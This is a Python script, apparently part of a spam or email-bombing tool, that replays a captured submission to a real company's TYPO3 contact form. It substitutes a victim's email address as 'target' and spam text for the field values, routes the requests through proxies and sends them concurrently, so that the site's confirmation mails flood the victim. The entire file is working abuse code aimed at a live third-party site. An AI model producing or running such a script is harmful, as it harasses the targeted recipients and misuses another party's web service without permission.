from os.path import basename

import requests

from module import Spam

cookies = {
    'cookieconsent_status': 'allow',
    'avsite_optin_functional': 'optin',
    'avsite_optin_statistic': 'optin',
    '_ga': 'GA1.2.788841332.1676998353',
    '_gid': 'GA1.2.1999438496.1676998353',
    'fe_typo_user': 'ed5e47b8a39871fc3bd8f6fb176a783d',
    '_gat_UA-69558560-1': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVsHVOiCul6OQaAVs',
    # 'Cookie': 'cookieconsent_status=allow; avsite_optin_functional=optin; avsite_optin_statistic=optin; _ga=GA1.2.788841332.1676998353; _gid=GA1.2.1999438496.1676998353; fe_typo_user=ed5e47b8a39871fc3bd8f6fb176a783d; _gat_UA-69558560-1=1',
    'Origin': 'https://www.index-traub.it',
    'Referer': 'https://www.index-traub.it/en/company/contact?tx_form_formframework%5Baction%5D=perform&tx_form_formframework%5Bcontroller%5D=FormFrontend&cHash=b4c586543103567e9554a0f5d547c9ec',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'connection': 'keep-alive'
}

params = {
    'tx_form_formframework[action]': 'perform',
    'tx_form_formframework[controller]': 'FormFrontend',
    'cHash': 'b4c586543103567e9554a0f5d547c9ec',
}
s = 'Thank_you_for_your_request_'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][__state]"\r\n\r\nTzozOToiVFlQTzNcQ01TXEZvcm1cRG9tYWluXFJ1bnRpbWVcRm9ybVN0YXRlIjoyOntzOjI1OiIAKgBsYXN0RGlzcGxheWVkUGFnZUluZGV4IjtpOjA7czoxMzoiACoAZm9ybVZhbHVlcyI7YToyNDp7czo5OiJncmlkcm93LTEiO047czoxNDoic2luZ2xlc2VsZWN0LTEiO3M6OToidW5pdmVyc2FsIjtzOjg6ImhpZGRlbi0xIjtzOjA6IiI7czo5OiJncmlkcm93LTIiO047czoxNDoic2luZ2xlc2VsZWN0LTIiO3M6NDoibWFsZSI7czo2OiJ0ZXh0LTEiO3M6NDoidGVzdCI7czo5OiJncmlkcm93LTMiO047czo2OiJ0ZXh0LTMiO3M6NDoidGVzdCI7czo2OiJ0ZXh0LTIiO3M6NDoidGVzdCI7czo5OiJncmlkcm93LTQiO047czo2OiJ0ZXh0LTQiO3M6NDoidGVzdCI7czoxMToiY291bnRyaWVzLTEiO3M6MjoiQUYiO3M6OToiZ3JpZHJvdy01IjtOO3M6NjoidGV4dC01IjtzOjQ6InRlc3QiO3M6NjoidGV4dC02IjtzOjQ6InRlc3QiO3M6OToiZ3JpZHJvdy02IjtOO3M6MTA6ImZpZWxkc2V0LTEiO047czoxMToidGVsZXBob25lLTEiO3M6NDoidGVzdCI7czo3OiJlbWFpbC0xIjtzOjE4OiJ3ZXp4YXNxd0BnbWFpbC5jb20iO3M6MTA6ImNoZWNrYm94LTEiO3M6MToiMSI7czoxNDoibGlua2NoZWNrYm94LTEiO3M6MToiMSI7czoxMDoidGV4dGFyZWEtMSI7czo0OiJ0ZXN0IjtzOjE5OiJhdXRvY2FwdGNoYS1hdmZvcm1zIjtOO3M6MTM6ImM0UkNXWG54ZlNZUWsiO3M6MDoiIjt9fQ==ddb05062a0926b9d0e8b5b689bea7010cd93c29a\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][__session]"\r\n\r\nd6953000d062fd629d1982f79a0b828e0450d8f8|3c69cf54569e5988f6c0271e315d2890389d3b7f\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[__trustedProperties]"\r\n\r\n{"contactEN-4":{"singleselect-1":1,"hidden-1":1,"singleselect-2":1,"text-1":1,"text-3":1,"text-2":1,"text-4":1,"countries-1":1,"o8Se2ZjXK0iFskTg6m3Nbt5":1,"text-5":1,"text-6":1,"telephone-1":1,"email-1":1,"checkbox-1":1,"linkcheckbox-1":1,"textarea-1":1,"__currentPage":1}}1a7ad5f9b325c4bd425c2c811676f18e72fa9d2c\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][singleselect-1]"\r\n\r\nuniversal\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][hidden-1]"\r\n\r\n\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][singleselect-2]"\r\n\r\nmale\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][text-1]"\r\n\r\ntest\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][text-3]"\r\n\r\ntest\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][text-2]"\r\n\r\ntest\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][text-4]"\r\n\r\n21032\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][countries-1]"\r\n\r\nAF\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][o8Se2ZjXK0iFskTg6m3Nbt5]"\r\n\r\n\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][text-5]"\r\n\r\ntest\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][text-6]"\r\n\r\ntest\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][telephone-1]"\r\n\r\ntest\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][email-1]"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][checkbox-1]"\r\n\r\n\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][checkbox-1]"\r\n\r\n1\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][linkcheckbox-1]"\r\n\r\n\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][linkcheckbox-1]"\r\n\r\n1\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][textarea-1]"\r\n\r\ntest\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs\r\nContent-Disposition: form-data; name="tx_form_formframework[contactEN-4][__currentPage]"\r\n\r\n1\r\n------WebKitFormBoundaryVsHVOiCul6OQaAVs--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())

        response = requests.post('https://www.index-traub.it/en/company/contact', params=params, cookies=cookies,
                                 headers=headers, data=data.encode(), proxies=self.get_proxies())

        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
